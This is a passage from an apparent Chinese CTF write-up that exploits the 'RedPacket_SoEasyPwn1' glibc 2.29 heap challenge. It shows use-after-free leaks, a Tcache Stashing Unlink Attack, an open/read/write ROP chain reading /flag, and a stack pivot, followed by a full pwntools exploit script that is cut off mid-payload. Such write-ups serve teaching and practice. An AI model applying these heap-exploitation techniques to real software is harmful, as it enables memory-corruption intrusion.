class="hljs-keyword">sl</span>(value)<br><br>def show(<span class="hljs-built_in">index</span>):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'4'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br></code></pre></td></tr></tbody></table></figure><h2 id="构造tcache-bin"><a href="#构造tcache-bin" class="headerlink" title="构造tcache-bin"></a>构造tcache bin</h2><p>首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#<span class="hljs-number">1.0</span>x10 <span class="hljs-number">2.0</span>xf0 <span class="hljs-number">3.0</span>x300 <span class="hljs-number">4.0</span>x400<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_15'</span>)<br>    <span class="hljs-built_in">free</span>(<span class="hljs-number">15</span>)<br><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-string">'Chunk_14'</span>)<br>    <span class="hljs-built_in">free</span>(<span class="hljs-number">14</span>)<br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>此时我们利用UAF可以泄露出heap地址</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">15</span>)</span></span><br>last_chunk_addr = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.strip</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'last_chunk_addr'</span>,last_chunk_addr)</span></span><br>heap_addr = last_chunk_addr - <span class="hljs-number">0</span>x26C0<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'heap_addr'</span>,heap_addr)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="利用unsorted-bin构造两个small-bin-chunk"><a href="#利用unsorted-bin构造两个small-bin-chunk" class="headerlink" title="利用unsorted-bin构造两个small-bin-chunk"></a>利用unsorted bin构造两个small bin chunk</h2><blockquote><p>当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，<br>而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。</p></blockquote><p>我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free 大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。</p><p>申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_1'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br>libc_base = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.strip</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0</span>x1E4CA0<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'libc_base'</span>,libc_base)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><p>在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>利用同样方法再构造一个small bin chunk</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_2'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-selector-id">#dbg</span>()<br><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><br><span class="hljs-selector-id">#dbg</span>()<br><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><p>并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0</p><h2 id="修改small-bin-chunk的bk指针为first-chunk-0x800"><a href="#修改small-bin-chunk的bk指针为first-chunk-0x800" class="headerlink" title="修改small-bin-chunk的bk指针为first-chunk-0x800"></a>修改small bin chunk的bk指针为first_chunk+0x800</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x300+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x101)+<span class="hljs-built_in">p64</span>(heap_addr+<span class="hljs-number">0</span>x37E0)+<span class="hljs-built_in">p64</span>(heap_addr+<span class="hljs-number">0</span>x250+<span class="hljs-number">0</span>x10+<span class="hljs-number">0</span>x800-<span class="hljs-number">0</span>x10)<br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">2</span>,payload)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>再次申请0x100大小的chunk，<strong>程序仅会检查Chunk2的fd指针是否指向Chunk1</strong>，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.</p><p class='item-img' data-src='https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="构造ORW的ROP链放入堆块中"><a href="#构造ORW的ROP链放入堆块中" class="headerlink" title="构造ORW的ROP链放入堆块中"></a>构造ORW的ROP链放入堆块中</h2><p>先获取一些gadget段， file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap 0x0000000000004A40</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">pop_rdi_ret</span> = libc_base + <span class="hljs-number">0</span>x0000000000026542<br><span class="hljs-attr">pop_rsi_ret</span> = libc_base + <span class="hljs-number">0</span>x0000000000026f9e<br><span class="hljs-attr">pop_rdx_ret</span> = libc_base + <span class="hljs-number">0</span>x000000000012bda6<br><span class="hljs-attr">file_name_addr</span> = heap_addr + <span class="hljs-number">0</span>x0000000000004A40 <span class="hljs-comment">#下一个chunk的mem位置起始位置</span><br><span class="hljs-attr">flag_addr</span> = file_name_addr + <span class="hljs-number">0</span>x0000000000000200 <span class="hljs-comment">#将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容</span><br><span class="hljs-attr">ROP_chain</span>  = <span class="hljs-string">'/flag\x00\x00\x00'</span><br></code></pre></td></tr></tbody></table></figure><p>open(file_name_addr,0)</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(file_name_addr)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rsi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)<br>ROP_chain += <span class="hljs-built_in">p64</span>(libc_base+libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'open'</span>]</span>)<br></code></pre></td></tr></tbody></table></figure><p>read(3,flag_addr,0x40)<br>Read函数的第一个参数文件描述符从0开始累加，<br>程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，<br>这样在程序中，每打开一个文件，文件描述符值从3开始累加。<br>我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件<br>read函数第一个参数是3，就是在这个文件里读取数据。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">3</span>)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rsi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(flag_addr)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdx_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40)<br>ROP_chain += <span class="hljs-built_in">p64</span>(libc_base+libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'read'</span>]</span>)<br></code></pre></td></tr></tbody></table></figure><p>write(1,flag_addr,0x40)</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">1</span>)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rsi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(flag_addr)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdx_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40)<br>ROP_chain += <span class="hljs-built_in">p64</span>(libc_base+libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'write'</span>]</span>)<br></code></pre></td></tr></tbody></table></figure><p>申请chunk，将ROP链写到chunk里</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,ROP_chain)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。<br class='item-img' data-src='https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">leave_ret = libc_base + <span class="hljs-number">0</span>x0000000000058373<br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'Your input: '</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(<span class="hljs-string">'666'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'What do you want to say?'</span>)</span></span><br>#栈迁移<br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(<span class="hljs-string">'A'</span>*<span class="hljs-number">0</span>x80 + p64(file_name_addr)</span></span> + <span class="hljs-built_in">p64</span>(leave_ret))<br><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import *<br>context(<span class="hljs-attribute">endian</span>=<span class="hljs-string">'little'</span>,os='linux',arch='amd64',log_level='debug') <br><br>sh = process(<span class="hljs-string">'./RedPacket_SoEasyPwn1'</span>)<br><span class="hljs-comment">#sh = remote('node4.buuoj.cn','27283')</span><br><br><span class="hljs-attribute">libc</span>=ELF("./libc-2.29.so")<br><br> <br> <br><br>s       = lambda data               :sh.send(data)<br>sa      = lambda delim,data         :sh.sendafter(delim, data)<br>sl      = lambda data               :sh.sendline(data)<br>sla     = lambda delim,data         :sh.sendlineafter(delim, data)<br>r       = lambda <span class="hljs-attribute">num</span>=4096           :sh.recv(num)<br>ru      = lambda delims    :sh.recvuntil(delims)<br>itr     = lambda                    :sh.interactive()<br>uu32    = lambda data               :u32(data.ljust(4,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(8,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg      = lambda address,data       <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br>def dbg():<br>        gdb.attach(sh)<br>        pause()<br> <br><br>def <span class="hljs-built_in">add</span>(index,chunk_size_index,value):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'1'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br>    ru(<span class="hljs-string">'How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): '</span>)<br>    sl(str(chunk_size_index))<br>    ru(<span class="hljs-string">'Please input content: '</span>)<br>    sl(value)<br><br>def free(index):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'2'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br><br>def <span class="hljs-built_in">edit</span>(index,value):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'3'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br>    ru(<span class="hljs-string">'Please input content: '</span>)<br>    sl(value)<br><br>def show(index):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'4'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br><br><br> <br><br><span class="hljs-comment">#1.0x10 2.0xf0 3.0x300 4.0x400</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    <span class="hljs-built_in">add</span>(15,4,<span class="hljs-string">'Chunk_15'</span>)<br>    free(15)<br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(6):<br>    <span class="hljs-built_in">add</span>(14,2,<span class="hljs-string">'Chunk_14'</span>)<br>    free(14)<br><br><span class="hljs-comment">#dbg()</span><br><br>show(15)<br>last_chunk_addr = u64(ru(<span class="hljs-string">'\x0A'</span>).strip(<span class="hljs-string">'\x0A'</span>).ljust(8,<span class="hljs-string">'\x00'</span>))<br>lg(<span class="hljs-string">'last_chunk_addr'</span>,last_chunk_addr)<br>heap_addr = last_chunk_addr - 0x26C0<br>lg(<span class="hljs-string">'heap_addr'</span>,heap_addr)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(1,4,<span class="hljs-string">'Chunk_1'</span>)<br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br>free(1)<br>show(1)<br>libc_base = u64(ru(<span class="hljs-string">'\x0A'</span>).strip(<span class="hljs-string">'\x0A'</span>).ljust(8,<span class="hljs-string">'\x00'</span>)) - 0x1E4CA0<br>lg(<span class="hljs-string">'libc_base'</span>,libc_base)<br><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100</span><br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk</span><br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunk</span><br><span class="hljs-built_in">add</span>(2,4,<span class="hljs-string">'Chunk_2'</span>)<br><span class="hljs-comment">#申请一个chunk防止合并</span><br><span class="hljs-built_in">add</span>(13,4,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br>free(2)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">payload</span>=<span 